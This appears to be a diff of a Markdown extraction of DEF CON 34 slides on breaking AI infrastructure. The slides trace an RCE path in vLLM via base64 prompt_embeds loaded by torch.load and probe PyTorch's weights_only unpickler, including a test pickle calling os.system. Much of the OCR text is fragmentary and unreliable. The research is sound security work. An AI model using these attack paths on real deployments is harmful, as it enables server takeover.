@@ -4,23 +4,28 @@ speakers: ["Ji'an Zhou", "Lei Lu"]
 conference: "DEF CON"
 conference_full: "DEF CON 34"
 edition: "34"
-year: null
+year: 2026
 source_pdf: "DEF CON 34/DEF CON 34 - Ji'an Zhou, Lei Lu - One Chain to Own Them All - Breaking AI Infrastructures - azraelxuemo v3.pdf"
 pages: 143
 sha256: "0ab97ef76707c58a515d9ea2732e5cb33e69a9f9585016d390fb98cec1def43c"
-text_chars: 102156
-ocr_pages: 119
+text_chars: 92641
+ocr_pages: 115
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 87.8
+ocr_unreliable_blocks: 9
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-12T00:25:32Z"
+converted_at: "2026-08-12T06:39:35Z"
 ---
 # One Chain to Own Them All - Breaking AI Infrastructures
 
 **Speakers:** Ji'an Zhou, Lei Lu  
 **Conference:** DEF CON 34  
 **Source:** `DEF CON 34/DEF CON 34 - Ji'an Zhou, Lei Lu - One Chain to Own Them All - Breaking AI Infrastructures - azraelxuemo v3.pdf` (143 pages)
+
 
 ## Slide 1
 
@@ -58,7 +63,8 @@ All Owned
 
 4
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “LLM!
@@ -71,14 +77,11 @@ LARGE LANGUAGE MODEL
 
 5
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Evolution: LLM > RAG — Agent
-Es RAG eole
-'s fe
-prompt ve )
-- )
 answer answer
 ```
 
@@ -88,7 +91,8 @@ answer answer
 
 6
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Al + Security
@@ -98,9 +102,6 @@ Detect threats
 Respond faster
 Find vulnerabilities
 reinforce
-each other
-o
-~nwue-
 Security for Al
 Al is the subject
 Protect the model
@@ -116,7 +117,8 @@ Prevent misuse
 
 https://unpromptedcon.org/
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Al For Security
@@ -147,20 +149,14 @@ https://www.wiz.io/blog/
 
 8
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Security For Al
 MOLTBOOK
-\ naar
 | Context.ai OAuth |
 | Token Compromise |
-peigls —
-\V8 ees, a
-SR
-WiZkesea
-ae
-Al =
 Hacking Moltbook: The Al
 Social Network Any Human
 Can Control
@@ -169,12 +165,7 @@ Compromise
 Agentic Browser Security:
 2025 Year-End Review
 Merav Bar, Hila Ramati,
-a Rami McCarthy , }
 anuary 17, 202¢ @, GalNagli Al » Maayan Bentor
-wiZResearch rr
-WIZResearch
-\ <ANvIpIA
-\ Vulnerability Details
 The risk in malicious Al
 How Wiz found a Critical
 NVIDIA Al vulnerability: Deep
@@ -182,14 +173,12 @@ Dive into a container escape
 (CVE-2024-0132)
 Shir Tamari, Ronen Shustin,
 é g Ss Andres Riancho
-oe
 February 12, 2025
 models: Wiz Research
 discovers critical vulnerability
 in Al-as-a-Service provider,
 Replicate
 @ Shir Tamari, Sagi Tzadik
-poRee
 May 23, 2024
 https://www.wiz.io/blog/
 MCP Auto-Execution: From Git
@@ -206,7 +195,8 @@ Extension
 
 9
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Security For Al
@@ -241,12 +231,12 @@ NVIDIA Container Toolkit $30,000 3
 
 12
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Classifying Al Targets
 DATA & VECTOR STORAGE MODEL INFERENCE & SERVING FOUNDATIONAL INFRASTRUCTURE
-pit @ NVIDIA
 Chroma pgvector Redis Ollama _, NWIDIA Triton NVIDIA Toolkit
 Inference Server
 ```
@@ -257,11 +247,11 @@ Inference Server
 
 13
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “New Security Contest Hosted by Wiz
-rT
 Powers fast LLM endpoints in the cloud.
 fo} Ollama
 Runs consumer Al models in the cloud.
@@ -281,7 +271,8 @@ Container escape
 
 14
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Summary of Al Targets & Categories
@@ -289,7 +280,6 @@ DATA & VECTOR STORAGE
 MODEL INFERENCE & SERVING
 FOUNDATIONAL INFRASTRUCTURE
 Chroma pgvector Redis
-fe} vitm &,
 Ollama NVIDIA Triton
 Inference Server
 > NVIDIA
@@ -304,19 +294,15 @@ NVIDIA Toolkit
 
 15
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Data & Vector Storage
-a
-ee
-~ DATA & VECTOR STORAGE)
 (MODEL INFERENCE & SERVING |
 FOUNDATIONAL INFRASTRUCTURE
 Chroma
-& sg
 pgvector Redis
-fo} vLLM SS
 NVIDIA Triton
 Ollama Inference Server
 NVIDIA
@@ -331,15 +317,13 @@ NVIDIA Toolkit
 
 16
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Architecture
 Clients
-LJ
-dD Chroma
 Gateways Distributed Log
-1
 '
 '
 '
@@ -354,17 +338,16 @@ Query Nodes
 
 17
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Written in Rust q Chroma
-s) chroma-core / chroma Q Type (/)to search fos +
 <> Code © Issues 260 3] Pullrequests 291 © Actions [fH Projects wiki © Securityand quality | Insights
 {) Files chroma / rust / (2
 P main ~ + Q tanujnay112 [CHORE]: Create per-tenant config in the compactor for shard sizes (#... GB =X 3676846 - :
 Q Goto file t
 Name Last commit message
-| v G@ rust
 > QW api-types =.
 > [® benchmark ® api-types [RELEASE] Rust client 0.13.3 (#6769)
 > ll blockstore © benchmark [CHORE]: Update google cloud spanner dependency + update rust version (...
@@ -390,7 +373,8 @@ Name Last commit message
 
 18
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 a
@@ -412,11 +396,11 @@ PRIZE $ POINTS
 
 19
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “'My Discovery
-@trace_method("FastAPI.create_collection", OpenTelemetryGranularity. OPERATION)
 async def create_collection(
 self,
 request: Request,
@@ -430,7 +414,6 @@ create = validate_model(CreateCollection, orjson. loads(raw_body) )
 if not create.configuration:
 else:
 configuration = load_create_collection_configuration_from_json(
-create. configuration
 def build_from_config(config: Dict[str, Any]) -> “EmbeddingFunction[Documents]":
 model_name = config.get("model_name")
 device = config.get("device")
@@ -442,7 +425,6 @@ return SentenceTransformerEmbeddingFunction(
 model_name=model_name,
 device=device,
 normalize_embeddings=normalize_embeddings,
-sekkwargs,
 if json_map.get("embedding_function") is not None:
 ef_config = json_map["embedding_function"]
 if ef_config["type"] == "legacy":
@@ -465,7 +447,8 @@ result ["embedding_function"] = ef.build_from_config(ef_config["config"])
 
 https://github.com/chroma-core/chroma/issues/6717
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “'My Discovery
@@ -480,7 +463,6 @@ Detail
 First, the API Server of Chroma has an interface called create_collection.
 And it will calls the load_create_collection_configuration_from_json function.
 https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py#L816
-https://github.com/chroma-core/chroma/issues/67 17
 20
 ```
 
@@ -490,7 +472,8 @@ https://github.com/chroma-core/chroma/issues/67 17
 
 21
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Pwned Again!
@@ -498,9 +481,7 @@ TrendAl Zero Day Initiative @ @thezdi - 51448 (Jor
 Confirmed! haehae (@haehaeYang) of Out Of Bounds chained 2 bugs
 (CWE-190, CWE-362) to exploit Chroma, earning $20,000 and 2 Master of
 Pwn points. Full win! #Pwn2Own #P2O0Berlin
-oy
 Out of Bounds
-oobs.io
 21
 ```
 
@@ -510,17 +491,15 @@ oobs.io
 
 22
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Choose vLLM - Written in Python
 DATA & VECTOR STORAGE
 FOUNDATIONAL INFRASTRUCTURE |
 ___|_MODEL INFERENCE & SERVING ea
-? s
 Chroma pgvector Redis
-———
-(3)
 Ollama
 vLLM
 @ |
@@ -540,21 +519,18 @@ Toolkit
 
 23
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Latest Version Recap
-U ERM
-Wiz @ @wiz_io - 20254F10A18 Yu
 Introducing ZERODAY.CLOUD &
 Be the first to participate in the first-of-its-kind cloud hacking competition.
 WIN PRIZES from our 4.5M$ prize pool. §
 Register your exploit > zeroday.clouc
-©. https://github.com/vllm-project/vllm/releases?page=2
 @msftsecresponse @awscloud @googlecloud
 Oct 3, 2025 v0.11.0
 WIZ Research @ simon-mo
-AY © veb302¢ Highlights
 6 ‘OUD compare ~ This release fea
 The first of its kind cloud hacking competition
 - STARTING NOW! -
@@ -567,7 +543,8 @@ The first of its kind cloud hacking competition
 
 24
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Contest Environment Setup
@@ -607,7 +584,8 @@ Code Blame 25 lines (20 loc) + 520 Bytes
 
 25
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Supported APIs
@@ -646,7 +624,6 @@ Code Blame 25 lines (20 loc) + 520 Bytes
 (APIServer
 (APIServer
 (APIServer
-(aPIServer
 INFO
 INFO
 INFO
@@ -685,44 +662,19 @@ INFO:
 INFO:
 04-14
 04-14
-Q4-14
-Q4-14
-04-14
-Q4-14
-Q4-14
-Q4-14
-04-14
-04-14
-Q4-14
-@4-14
-04-14
-Q4-14
 04-14
 04-14
 04-14
-Q4-14
-Q4-14
-Q4-14
-04-14
-Q4-14
-04-14
-04-14
-Q4-14
-Q4-14
 04-14
 04-14
 04-14
-Q4-14
 04-14
 04-14
-Q4-14
+04-14
 21:
 217
-21:
 21%
 21:
-21%
-213
 215
 213
 21%
@@ -734,7 +686,6 @@ Q4-14
 21:
 213
 21%
-21:
 21:
 21:
 21:
@@ -747,37 +698,19 @@ Q4-14
 21:
 21:
 21:
-215
-21:
 50:
 50:
-250:
 50:
-239
+50:
 50:
 50:
 50:
 50:
 50:
 239
-58
-58
-50:
-239
 50:
 50:
 50:
-50:
-50:
-239
-58
-58
-50:
-239
-50:
-50:
-50:
-250:
 50:
 239
 50:
@@ -786,8 +719,9 @@ Q4-14
 50:
 50:
 50:
-58
-58
+50:
+50:
+50:
 39
 39
 39
@@ -845,9 +779,6 @@ Lapi_server.py:1
 [launcher.
 [launcher.
 [launcher.
-[launcher.
-[launcher.
-[launcher.
 py
 Py:
 Py:
@@ -860,33 +791,27 @@ py:
 242]
 Py
 Py:
-242]
 Py
 Py:
 Py:
-242]
 Py
 Py:
 py:
 Py:
 Py:
-242]
 Py
 Py:
 Py:
 Py:
 Py:
-242]
 py
 Py:
 Py:
 py:
 Py:
-242]
 py
 py:
 Py:
-242]
 py
 Started server process
 Waiting for application startup.
@@ -915,7 +840,6 @@ Application startup complete.
 42]
 42]
 42]
-ct]
 121 Starting vILM API server @ on http://0.0.0.0:8000
 Available routes are:
 Route:
@@ -980,7 +904,6 @@ Route:
 /is_scaling_elastic_ep, Methods: POST
 /invocations, Methods: POST
 /metrics, Methods: GET
-POST,
 25
 ```
 
@@ -990,23 +913,19 @@ POST,
 
 26
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Simple Test
-|AUCINUOA
 [
 xuemo>curl http://localhost:800@/v1/completions -H "Content-Type: application/json" -d '{
 "model": "facebook/opt-125m",
 "prompt": "Hello, my name is",
-"max_tokens": 50
-yeu
-"id": "cmp1-4331dffc745345bd87ea5d68ece4195c", "object": "text completion", "created" :1776233929, "model": "facebook/opt-125
 m", "choices": [{"index":@,"text":" Mica, i have a female b FieldTerrier that wants to go ahead and find her due. It is a
 n all day Moonglow National Memorial and I am grateful for you. How could she be so lonely.... No one","logprobs":nu
 IIT, "Finish_reason™: "length", "stop_reason":null, "token_ids™:nul1, "prompt_logprobs"™:nul1, "prompt_token_ids™:null}J, "servi
 ce_tier":null, "system_fingerprint":null, "usage": {"prompt_tokens":6, "total_tokens":56, "completion_tokens":50, "prompt_tok
-ens_details":null}, "kv_transfer_params" :nul1}xuemo>fJ
 26
 ```
 
@@ -1016,7 +935,8 @@ ens_details":null}, "kv_transfer_params" :nul1}xuemo>fJ
 
 27
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Useless Endpoints
@@ -1047,7 +967,8 @@ ens_details":null}, "kv_transfer_params" :nul1}xuemo>fJ
 
 28
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Common Vulnerability Patterns
@@ -1080,15 +1001,14 @@ Danger: xml.etree.ElementTree. parse(untrusted)
 
 29
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Found A Potential Vulnerability?
 1 @router.post("/tokenize",
 2 async def tokenize(request: TokenizeRequest, raw_request: Request):
- SSTI?
 1 chat_template: Optional str’ = Field
-OnN out wn
 default=None,
 description=
 "Al Jinja |template to use for this conversion.
@@ -1107,7 +1027,6 @@ description=
 10 continue_final_message=request.continue_final_message,
 11 chat_template_kwargs=request.chat_template_kwargs,
 12 add_special_tokens=request.add_special_tokens, 29
-ry
 Ww
 ```
 
@@ -1119,15 +1038,14 @@ Ww
 
 30
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-a e.e
 False Positive
 “* Game Over
 1 jinja_env =| ImmutableSandboxedEnvironment (
 2 trim_blocks=True, lstrip_blocks=True, extensions=[AssistantTracker,
-jinja2.ext. loopcontrols]
 )
 jinja_env.filters["tojson"] = tojson
 jinja_env.globals["raise_exception"] = raise_exception
@@ -1138,7 +1056,6 @@ messages=chat,
 tools=tool_schemas,
 documents=documents,
 add_generation_prompt=add_generation_prompt,
-*kkKwargs,
 30
 ```
 
@@ -1152,11 +1069,11 @@ add_generation_prompt=add_generation_prompt,
 
 32
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “An Accidental Discovery
-ON OUR WYN
 1 @router.post("/v1/completions",
 2 async def create_completion(request: CompletionRequest, raw_request: Request):
 3 handler = completion(raw_request)
@@ -1168,8 +1085,6 @@ POST /v1/completions { "prompt_embeds": "<base64>" }
 }— api_server.py:651 handler.create_completion(request, raw_request)
 |— serving_completion.py:138 renderer.render_prompt_and_embeds(prompt_embeds=
 request.prompt_embeds)
-|— renderer. py:254 self. load_prompt_embeds (prompt_embeds )
-|— renderer. py:148 torch. load(io.Bytes1I0(pybase64.b64decode(embed) ),
 weights_only=True)
 32
 ```
@@ -1184,7 +1099,8 @@ weights_only=True)
 
 https://github.com/advisories/GHSA-53q9-r3pm-6pq6
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “My Previous Finding
@@ -1192,7 +1108,6 @@ https://github.com/advisories/GHSA-53q9-r3pm-6pq6
 ical ) malfet published GHSA-53q9-r3pm-6pq6 on Apr 18, 2025
 Package Affected versions Patched versions Severity
 @ pytorch (pip) <=2.5.1 2.6.0
-CVE ID
 Description CVE-2025-32434
 Description Weaknesses
 No CWEs
@@ -1232,22 +1147,19 @@ https://github.com/advisories/GHSA-53q9-r3pm-6pq6
 
 36
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Model Save and Load Flow
 Save pipeline
 Trained model weights Serialize and save
-model.state dict () torch.save(...)
-!
 checkpoint.pt
 Weights stored on disk
 Inference / Resume training
-+>
 Load pipeline
 Read checkpoint file
 torch.load(...)
-v
 f Load into model
 model.eval() or continue optimization
 | nose .load_state dict(...)
@@ -1260,7 +1172,8 @@ model.eval() or continue optimization
 
 37
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Early Stage
@@ -1283,7 +1196,8 @@ pickle.load(...)
 
 https://github.com/pytorch/pytorch/pull/86812
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Introducing weights only Mechanism
@@ -1315,15 +1229,14 @@ https://github.com/pytorch/pytorch/blob/v2.5.1/SECURITY.md
 
 40
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 " Al INFRASTRUCTURE
 A
 ( ‘\
-h I
 T = A bypass here would be massive
-: =
 weights_only=T
 ```
 
@@ -1337,7 +1250,8 @@ weights_only=T
 
 https://github.com/advisories/GHSA-53q9-r3pm-6pq6
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “My Previous Finding
@@ -1371,14 +1285,13 @@ https://github.com/advisories/GHSA-53q9-r3pm-6pq6
 
 42
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Attack Approach
-torch. load(...,
 weights_only=True)
 Is TorchScript format?
-Yes——® torch.jit.load(...) ------
 No—>
 _weights_only_unpickler
 Q Find vulnerabilities in it
@@ -1393,7 +1306,8 @@ Q Find vulnerabilities in it
 
 43
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Discovery Recap
@@ -1401,10 +1315,6 @@ S With this bypass, we can achieve RCE in vLLM!
 1 POST /v1/completions { "prompt_embeds": "“<base64>"" }
 2 |
 3 }— api_server.py:651 handler.create_completion(request, raw_request)
-4 — serving_completion.py:138 renderer. render_prompt_and_embeds(prompt_embeds=
-5 request. prompt_embeds )
-6 |— renderer. py:254 self. load_prompt_embeds (prompt_embeds )
-7 | renderer. py:148 torch. load(io.BytesI0(pybase64.b64decode(embed) ),
 8 weights_only=True)
 43
 ```
@@ -1417,7 +1327,8 @@ S With this bypass, we can achieve RCE in vLLM!
 
 https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Discovery Recap
@@ -1445,8 +1356,6 @@ No CWEs
 pip install vllm
 Credits
 But the version of PyTorch is specified in the requirements. txt file azraelxuemo Reporter
-vilm-project / vilm @ vussellb Coordinator
-https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw
 ```
 
 ## Slide 45
@@ -1455,7 +1364,8 @@ https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw
 
 45
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Discovery Recap
@@ -1473,7 +1383,6 @@ bar_format=_BAR_FORMAT,
 state = torch. load(
 bin_file, map_location=pt_load_map_location, weights_only=True
 )
-yield from state. items()
 del state
 45
 ```
@@ -1486,7 +1395,8 @@ del state
 
 46
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 a
@@ -1502,23 +1412,12 @@ numba == @.61.2; python_version > '3.9'
 # Dependencies for NVIDIA GPUs
 ray[cgraph]>=2.48.@ # Ray Compiled Graph, required for pipeline parallelism in V1.
 torch==2.8.0
-O©OMDNAUEWNR
 46
 ```
 
 ## Slide 47
 
 47
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-a
-" Can we hynass again»
-. vi Gail:
-imgfiip.com
-47
-```
 
 ## Slide 48
 
@@ -1528,7 +1427,8 @@ imgfiip.com
 
 https://github.com/pytorch/pytorch/pull/143326/changes
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "The Fix
@@ -1574,7 +1474,6 @@ with TorchScript archives passed to "
 )
 opened_file.seek(orig_position)
 return torch, jit. load(opened_file,
-Yes &——| torch.jit.load(...)
 No @—> _weights_only_unpickler
 https://github.com/pytorch/pytorch/pull/143326/changes
 48
@@ -1586,7 +1485,8 @@ https://github.com/pytorch/pytorch/pull/143326/changes
 
 49
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 "Strict Whitelist
@@ -1604,8 +1504,6 @@ elif full_path in _get_user_allowed_globals():
 self.append(_get_user_allowed_globals() [full_path] )
 elif full_path in (
 [
-"torch.nested._internal.nested_tensor.NestedTensor",
-"torch.nested._internal.nested_tensor._rebuild_njt",
 "torch._dynamo.decorators._DimRange",
 raise UnpicklingError("...")
 elif full_path in (
@@ -1634,7 +1532,8 @@ raise UnpicklingError("")
 
 50
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Simple Test
@@ -1643,7 +1542,6 @@ raise UnpicklingError("")
 3 f.write("cos\nsystem\n")
 4 torch. load("test.txt")
 [xuemo>python3 load.py
-/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_subc
 module named 'numpy' (Triggered internally at /pytorch/torch/csrc/utils,
 cpu = _conversion_method_template(device=torch.device("cpu") )
 Traceback (most recent call last):
@@ -1670,7 +1568,8 @@ Trying to}load unsupported GLOBAL os.system whose module os is blocked.
 
 51
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Inspecting Whitelisted Functions
@@ -1708,7 +1607,8 @@ torch._tensor._rebuild_from_type_v2 51
 
 52
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Inspecting Whitelisted Functions
@@ -1723,19 +1623,6 @@ torch._tensor._rebuild_from_type_v2 51
 module named 'numpy' (Triggered internally at /pytorch/torch/csr
 cpu = _conversion_method_template(device=torch.device("cpu") )
 torch.seriali i t_layout
-_ )_rebuild_tensor
-torch._utils!/_rebuild_gtensor
-torch._utils!_rebuild_device_tensor_from_numpy
-torch._utils!_rebuild_sparse_tensor
-torch._utils!_rebuild_tensor_v2
-torch._utils!_rebuild_parameter
-torch._utils!_rebuild_meta_tensor_no_storage
-torch._utils!_rebuild_hested_tensor
-torch._utils!_rebuild_tensor_v3
-torch._utils!_rebuild_parameter_with_state
-torch._utils|_rebuild_wrapper_subclass
-torch._utils|_rebuild_device_tensor_from_cpu_tensor
-torch. _tensor._rebuild| from_type_v2 52
 ```
 
 ## Slide 53
@@ -1746,7 +1633,8 @@ torch. _tensor._rebuild| from_type_v2 52
 
 53
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Quick Test
@@ -1777,7 +1665,8 @@ tensor([ 2, 3, 4,
 
 55
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Exploring Model File Format
@@ -1785,7 +1674,6 @@ tensor([ 2, 3, 4,
 2 tensor = torch.tensor([1,2,3,4,5,6,7,8,9,10], dtype=torch. long)
 3 torch.save(tensor, “tensor.pt")
 4 print(torch. load("tensor.pt") )
-/home/xuemo/pytorch-2.8.0/.venv/1lib/python3.12/site-—packages/torch,
 mpy' (Triggered internally at /pytorch/torch/csrc/utils/tensor_numy
 cpu = _conversion_method_template(device=torch.device("cpu") )
 i(.venv) xuemo>file tensor.pt
@@ -1799,7 +1687,8 @@ tensor.pt: Zip archive data, at least v@.@ to extract, compression method=store
 
 56
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 “Exploring Model File Format
@@ -1817,16 +1706,13 @@ tensor/data.pkl
 tensor/.format_version
 tensor/.storage_alignment
 tensor/byteorder
-tensor/data/@
 tensor/version
 tensor/.data/serialization_id
 1 import pickletools
 2 with open("tensor/data.pkl","rb") as f:
 3 pickletools.dis(f.read())
 35:
-are
 38:
-he
 Siz
 53:
 723
@@ -1834,7 +1720,6 @@ Siz
 80:
 82:
 90:
-92%
 94:
 95:
 97:
@@ -1846,7 +1731,6 @@ Siz
 107:
 108:
 110:
-A lB
 136:
 138:
 139:
@@ -1856,13 +1740,9 @@ A lB
 145:
 146:
 148:
-©» 2DQtFAQnDr~Q9KQKKRQHAKRKROQARQKAKAQIONIKA Ha
 GLOB
-BINP'
 MARK
-BINP'
 REDU
-BINP'
 STOP
 : \x8@ PROTO ~—_2
 AL 'torch._utils _rebuild_tensor_v2'
@@ -1872,7 +1752,6 @@ BINUNICODE 'storage'
 BINPUT 1
 GLOBAL ‘torch LongStorage'
 BINPUT 2
-BINUNICODE 'Q'
 BINPUT 3
 BINUNICODE 'cpu'
 BINPUT 4
@@ -1884,7 +1763,6 @@ BININT1 (2)
 BININT1 10
 TUPLE1
 BINPUT 6
-BININT1 a
 TUPLE1
 BINPUT 7
 NEWFALSE
@@ -1906,17 +1784,14 @@ UT 14:
 
 57
 
